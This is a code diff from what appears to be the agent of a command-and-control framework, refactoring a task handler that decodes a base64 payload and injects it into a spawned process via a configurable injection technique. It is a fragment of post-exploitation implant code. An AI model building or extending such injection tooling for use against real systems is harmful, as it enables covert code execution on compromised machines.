@@ -42,32 +42,17 @@ namespace Agent
             //Create new process
             byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
 
-            await WriteDebug("Spawning Process.", job.task.id);
-            if (!await this.spawner.Spawn(args.GetSpawnOptions(job.task.id)))
-            {
-                await messageManager.WriteLine("Process spawn failed.", job.task.id, true);
-                return;
-            }
-
-            await WriteDebug("Getting Process Handle.", job.task.id);
-            if (!spawner.TryGetHandle(job.task.id, out var handle))
-            {
-                await messageManager.WriteLine("Failed to get handle for process", job.task.id, true);
-                return;
-            }
-
-            await WriteDebug("Selecting Technique with ID: " + this.config.inject, job.task.id);
+            SpawnOptions so = args.GetSpawnOptions(job.task.id);
             try
             {
                 var technique = techniques.Where(x => x.id == this.config.inject).First();
                 if (technique is null)
                 {
-                    await WriteDebug("Technique is Null.", job.task.id);
+                    await WriteDebug("Failed to find technique", job.task.id);
                     return;
                 }
-                
-                await WriteDebug("Spawning Process.", job.task.id);
-                if (!technique.Inject(buf, handle.DangerousGetHandle()))
+
+                if(!technique.Inject(spawner, so, buf))
                 {
                     await messageManager.WriteLine("Inject Failed.", job.task.id, true, "error");
                     return;
@@ -78,7 +63,32 @@ namespace Agent
                 await WriteDebug(e.ToString(), job.task.id);
             }
 
-            await messageManager.WriteLine("Inject Failed.", job.task.id, true);
+
+
+
+
+
+
+
+
+
+            //await WriteDebug("Spawning Process.", job.task.id);
+            //if (!await this.spawner.Spawn(args.GetSpawnOptions(job.task.id)))
+            //{
+            //    await messageManager.WriteLine("Process spawn failed.", job.task.id, true);
+            //    return;
+            //}
+
+            //await WriteDebug("Getting Process Handle.", job.task.id);
+            //if (!spawner.TryGetHandle(job.task.id, out var handle))
+            //{
+            //    await messageManager.WriteLine("Failed to get handle for process", job.task.id, true);
+            //    return;
+            //}
+
+            //await WriteDebug("Selecting Technique with ID: " + this.config.inject, job.task.id);
+
+            //await messageManager.WriteLine("Inject Failed.", job.task.id, true);
             return;
         }
 
